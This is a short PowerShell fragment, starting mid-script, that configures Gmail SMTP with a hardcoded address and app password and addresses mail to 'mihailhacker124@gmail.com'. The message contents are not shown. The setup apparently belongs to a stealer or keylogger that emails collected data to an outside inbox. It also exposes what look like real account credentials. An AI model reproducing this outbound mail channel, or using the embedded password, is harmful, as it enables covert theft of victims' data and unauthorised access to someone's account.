...
$smtp.Credentials = New-Object System.Net.NetworkCredential("mishustick34@gmail.com", "wyypuoxciblypvqt");
$smtp.EnableSsl = $true
$Message.From = "mishustick34@gmail.com"
$Message.To.Add("mihailhacker124@gmail.com")
